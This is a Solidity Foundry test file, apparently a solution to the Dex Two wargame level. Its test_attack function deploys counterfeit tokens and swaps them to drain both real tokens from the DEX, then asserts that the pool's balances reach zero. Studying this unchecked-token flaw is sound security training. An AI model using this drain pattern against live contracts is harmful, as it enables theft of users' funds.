// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";

contract DexTwoTest is Test {
    DexTwo public dex;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;

    address public player;
    address public alice;

    uint256 public constant INIT_SUPPLY = 1000e18;
    uint256 public constant INIT_BALANCE = 100e18;

    function setUp() public {
        player = makeAddr("player");
        alice = makeAddr("alice");
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", INIT_SUPPLY);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", INIT_SUPPLY);

        token1.approve(address(dex), INIT_BALANCE);
        token2.approve(address(dex), INIT_BALANCE);

        dex.add_liquidity({token_address: address(token1), amount: INIT_BALANCE});
        dex.add_liquidity({token_address: address(token2), amount: INIT_BALANCE});

        assertEq(token1.balanceOf(address(dex)), INIT_BALANCE);
        assertEq(token2.balanceOf(address(dex)), INIT_BALANCE);

        assertEq(token1.balanceOf(address(address(this))), INIT_SUPPLY - INIT_BALANCE);
        assertEq(token2.balanceOf(address(address(this))), INIT_SUPPLY - INIT_BALANCE);
    }

    function test_attack() public {
        SwappableTokenTwo maliciousToken1 = new SwappableTokenTwo(address(dex), "Evil Token 1", "EVIL1", INIT_SUPPLY);
        SwappableTokenTwo maliciousToken2 = new SwappableTokenTwo(address(dex), "Evil Token 2", "EVIL2", INIT_SUPPLY);

        maliciousToken1.approve(address(dex), INIT_BALANCE);
        maliciousToken2.approve(address(dex), INIT_BALANCE);

        dex.add_liquidity({token_address: address(maliciousToken1), amount: INIT_BALANCE});
        dex.add_liquidity({token_address: address(maliciousToken2), amount: INIT_BALANCE});

        maliciousToken1.transfer(player, INIT_BALANCE);
        maliciousToken2.transfer(player, INIT_BALANCE);

        vm.startPrank(player);
        maliciousToken1.approve(address(dex), INIT_BALANCE);
        maliciousToken2.approve(address(dex), INIT_BALANCE);

        dex.swap(address(maliciousToken1), address(token1), INIT_BALANCE);
        dex.swap(address(maliciousToken2), address(token2), INIT_BALANCE);
        vm.stopPrank();

        uint256 token1BalanceDex = token1.balanceOf(address(dex));
        uint256 token2BalanceDex = token2.balanceOf(address(dex));

        assertEq(token1BalanceDex, 0);
        assertEq(token2BalanceDex, 0);
    }
}
